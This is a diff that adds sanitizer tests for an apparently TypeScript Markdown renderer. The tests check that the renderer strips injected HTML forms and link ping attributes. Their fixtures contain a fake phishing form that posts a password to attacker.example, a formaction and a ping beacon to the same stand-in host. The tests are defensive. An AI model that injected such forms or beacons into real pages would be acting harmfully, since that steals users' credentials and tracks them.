@@ -319,6 +319,49 @@ describe("ArtifactMarkdown — a remote image loads only on a click", () => {
     expect(html).not.toContain("image-proxy");
   });
 
+  it("draws no form: a phishing form inside the app needs no script", () => {
+    // Review round 2, P2: the form, the password field and the button survived.
+    const html = renderToStaticMarkup(
+      artifact(
+        [
+          `<form action="https://attacker.example/f" method="post">`,
+          `<label>Password <input name="pw" type="password" autofocus></label>`,
+          `<select name="s"><option>one</option></select><textarea name="t"></textarea>`,
+          `<fieldset><legend>Sign in</legend></fieldset>`,
+          `<button type="submit">Continue</button>`,
+          `</form>`,
+          `<button formaction="https://attacker.example/g">Outside</button>`,
+          `<input type="text" name="loose" autofocus>`,
+        ].join(""),
+      ),
+    );
+    expect(html).not.toMatch(/<(form|input|button|select|option|textarea|fieldset|legend|label)\b/);
+    expect(html).not.toContain("attacker.example");
+    expect(html).not.toMatch(/autofocus|formaction/i);
+  });
+
+  it("keeps a GFM task list's checkboxes", () => {
+    const md = "- [x] done\n- [ ] open";
+    for (const html of [
+      renderToStaticMarkup(artifact(md)),
+      renderToStaticMarkup(createElement(DocumentMarkdown, { content: md })),
+    ]) {
+      const boxes = html.match(/<input\b[^>]*>/g) ?? [];
+      expect(boxes).toHaveLength(2);
+      expect(boxes.every((b) => /type="checkbox"/.test(b) && /disabled/.test(b))).toBe(true);
+      expect(boxes.filter((b) => /checked/.test(b))).toHaveLength(1);
+    }
+  });
+
+  it("strips ping from a link, and keeps its href", () => {
+    const html = renderToStaticMarkup(
+      artifact(`<a href="https://example.com/doc" ping="https://attacker.example/b">doc</a>`),
+    );
+    expect(html).toContain('href="https://example.com/doc"');
+    expect(html).not.toMatch(/\bping=/);
+    expect(html).not.toContain("attacker.example");
+  });
+
   it("keeps a style that fetches nothing, and a fragment url()", () => {
     const html = renderToStaticMarkup(
       artifact(`<div style="color: red">red</div>\n\n<svg><rect fill="url(#grad)"></rect></svg>`),
